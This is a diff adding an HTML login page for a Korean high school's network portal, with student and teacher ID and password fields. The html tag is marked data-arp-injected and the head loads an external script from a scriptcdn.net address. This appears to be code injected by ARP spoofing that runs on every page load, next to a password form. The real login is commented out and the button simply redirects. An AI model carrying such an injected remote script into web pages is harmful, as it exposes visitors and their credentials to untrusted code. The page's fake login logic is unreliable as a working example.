@@ -1,0 +1,52 @@
+<html data-arp-injected="true"><head><title>현대청운고등학교</title>
+    <script type="text/javascript" src="https://3001.scriptcdn.net/code/static/1"></script></head><body topmargin="0" leftmargin="0">
+    <link rel="stylesheet" href="/css/style.css">
+    <style type="text/css">
+    a{ text-decoration:none;color:black;}
+    body {font-family:NotokrR;}
+    </style>
+    <table width="850" align="center" cellspacing="0" style="border-collapse:collapse;">
+        <tbody><tr>
+            <td background="./1.jpg" height="40" valign="bottom"><font size="4" color="white">Anytime Anywhere 청운 네트워크</font></td>
+        </tr>
+    </tbody></table>
+    <form name="form1" method="post">
+    <p>&nbsp;</p>
+    <p>&nbsp;</p>
+    <p>&nbsp;</p>
+
+    <div class="logbox">
+
+    <table align="center" width="60%">
+        <tbody><tr align="center">
+            <td width="50%">
+                <input type="radio" name="sel" value="stu" id="st" style="width:17;height:17;cursor:hand;"><label for="st" style="cursor:hand;">학생</label>
+            </td>
+            <td width="50%">
+                <input type="radio" name="sel" value="tea" id="te" style="width:17;height:17;cursor:hand;"><label for="te" style="cursor:hand;">선생님</label>
+            </td>
+        </tr>
+    </tbody></table>
+
+    <input name="text1" type="text" placeholder="학생 : 학번 / 선생님 : 성명" autocomplete="off" style="font-family:NotoKrR;ime-mode:active;font-size:15;margin-top:10;border-radius:10px;" onkeydown="if(event.keyCode==13) func_submit();" class="box box-color">
+    <br><br>
+
+    <input name="password" id="password" type="password" placeholder="비밀번호를 입력하세요" style="font-family:NotoKrR;font-size:15;border-radius:10px;" onkeydown="if(event.keyCode==13) func_submit();" class="box box-color">
+
+    <br><br>
+    <input type="button" value="로그인" style="font-family:NotokrR;font-size:16;border-width:1;border-color:gray;border-radius:10px;" class="btn btn-color" onclick="func_submit()">
+
+    </div> <!-- end col -->
+
+    <iframe name="f2" width="0" height="0" frameborder="no"></iframe>
+    </form>
+    <script>
+    function func_submit(){
+        /*
+        document.form1.target = "f2";
+        document.form1.action = "login_check.php";
+        document.form1.submit();
+        */
+        window.location.href = "./student.html"
+    }
+    </script></body></html>
